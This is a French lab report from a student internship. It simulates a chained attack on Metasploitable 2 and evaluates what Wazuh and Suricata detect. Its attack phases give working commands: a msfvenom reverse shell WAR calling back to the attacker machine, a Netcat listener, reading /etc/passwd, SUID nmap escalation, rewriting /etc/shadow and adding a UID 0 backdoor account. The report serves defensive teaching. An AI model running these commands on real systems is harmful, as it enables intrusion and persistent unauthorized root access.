# Simulation d'attaque chaînée et détection d'intrusions

Projet réalisé dans le cadre d'un stage chez Ménara Holding — Université Cadi Ayyad, 2024/2025.

L'objectif était de simuler une attaque réaliste contre une machine vulnérable dans un environnement virtuel isolé, puis d'analyser ce qu'une solution SIEM parvient à détecter et ce qu'elle manque.

---

## Environnement de travail

Trois machines virtuelles sur VirtualBox, connectées via un réseau interne :

| Machine | Rôle | IP |
|---|---|---|
| Kali Linux | Attaquant | 192.168.100.11 |
| Metasploitable 2 | Cible | 192.168.100.12 |
| Wazuh + Suricata | SIEM / IDS | Bridge + intnet |

---

## Déroulement de l'attaque

### Phase 1 — Reconnaissance

Un ping pour confirmer que la cible est accessible, puis un scan Nmap pour identifier les services exposés :

```bash
nmap -sV 192.168.100.12
```

Deux services ont retenu l'attention : Apache Tomcat sur le port 8180 et SSH sur le port 22.

---

### Phase 2 — Exploitation de Tomcat Manager

L'interface Tomcat Manager était accessible sur `/manager/html` avec les identifiants par défaut. Le module `tomcat_mgr_login` de Metasploit a permis de les confirmer :

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.100.12
set RPORT 8180
run
```

Identifiants valides trouvés : `tomcat:tomcat`.

Génération d'un payload de reverse shell avec msfvenom :

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.100.11 LPORT=1337 -f war -o shell.war
```

Le fichier `shell.war` a été déposé via l'interface web de Tomcat Manager. Un listener Netcat a été mis en écoute, puis le shell déclenché en accédant à `/shell` depuis le navigateur :

```bash
nc -nvlp 1337
```

Le shell est revenu en tant que `tomcat55`. Amélioration vers un TTY interactif :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
```

---

### Phase 3 — Récupération d'identifiants

Depuis le shell obtenu, lecture du fichier `/etc/passwd` pour identifier les comptes présents :

```bash
cat /etc/passwd
```

L'utilisateur `msfadmin` a été repéré. Metasploitable 2 étant une machine volontairement vulnérable, le mot de passe par défaut `msfadmin:msfadmin` a été testé — et a fonctionné.

---

### Phase 4 — Connexion SSH

Utilisation des identifiants récupérés pour établir une session SSH plus stable :

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.100.12
```

L'option `-oHostKeyAlgorithms=+ssh-rsa` est nécessaire car Metasploitable 2 tourne sur une ancienne version de SSH qui ne supporte pas les algorithmes plus récents par défaut.

---

### Phase 5 — Élévation de privilèges

**Méthode 1 — sudo (msfadmin fait partie du groupe sudoers par défaut sur Metasploitable 2) :**

```bash
sudo su
```

**Méthode 2 — binaire SUID, pour les cas où sudo n'est pas disponible :**

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/nmap` est apparu dans les résultats. Les anciennes versions de nmap disposent d'un mode interactif permettant d'exécuter des commandes shell. Comme le binaire possède le bit SUID, ces commandes s'exécutent avec les privilèges root :

```bash
/usr/bin/nmap --interactive
!sh
whoami  # root
```

---

### Phase 6 — Post-exploitation

Modification du mot de passe root en générant un nouveau hash et en l'écrivant directement dans `/etc/shadow` :

```bash
openssl passwd -1 hacked
sed -i 's|^root:[^:]*:|root:<nouveau_hash>:|' /etc/shadow
```

Création d'un compte backdoor avec UID 0 (identique à root) pour conserver l'accès même si le mot de passe root est modifié ultérieurement :

```bash
useradd hacker -u 0 -o -g 0 -s /bin/bash
passwd hacker
```

Vérification de l'accès root persistant via SSH :

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.100.12
```

---

## Résultats de détection — Wazuh + Suricata

| Alerte | SID | Sévérité |
|---|---|---|
| ET SCAN Nmap User-Agent Observed | 2024364 | Low |
| Basic Auth Base64 non chiffrée (Tomcat) | 2006380 | Low |
| Anomalies protocole SMTP | — | Low |
| Requêtes HTTP POST /sdk — activité webshell | 2024364 | Low |
| Connexion SSH détectée (règle personnalisée) | 1000001 | Low |

La détection SSH a nécessité l'écriture manuelle d'une règle dans `local.rules`, Suricata n'en incluant pas une par défaut.

**Ce que Wazuh n'a pas détecté :** aucun agent n'était déployé sur Metasploitable 2, donc toutes les actions locales sont passées inaperçues — élévation de privilèges, création d'utilisateur, modification de `/etc/shadow`. Suricata ne voit que le trafic réseau, ce qui signifie que tout ce qui se passe localement sur l'hôte reste invisible. C'est une limite importante à garder en tête : la surveillance réseau seule ne suffit pas.

---

## Mesures correctives

- Désactiver ou restreindre l'accès à Tomcat Manager ; ne jamais laisser les identifiants par défaut
- Imposer HTTPS sur toute interface gérant de l'authentification
- Restreindre SSH à des IP spécifiques et passer à l'authentification par clés
- Désactiver les services inutilisés (SMTP, Telnet, FTP...)
- Déployer des agents Wazuh sur les hôtes pour couvrir les actions locales, pas seulement le trafic réseau

---

## Outils utilisés

Kali Linux, Metasploitable 2, Wazuh, Suricata, Metasploit Framework, msfvenom, Nmap, Netcat, VirtualBox

---

*Réalisé dans un environnement de lab entièrement isolé, à des fins éducatives.*
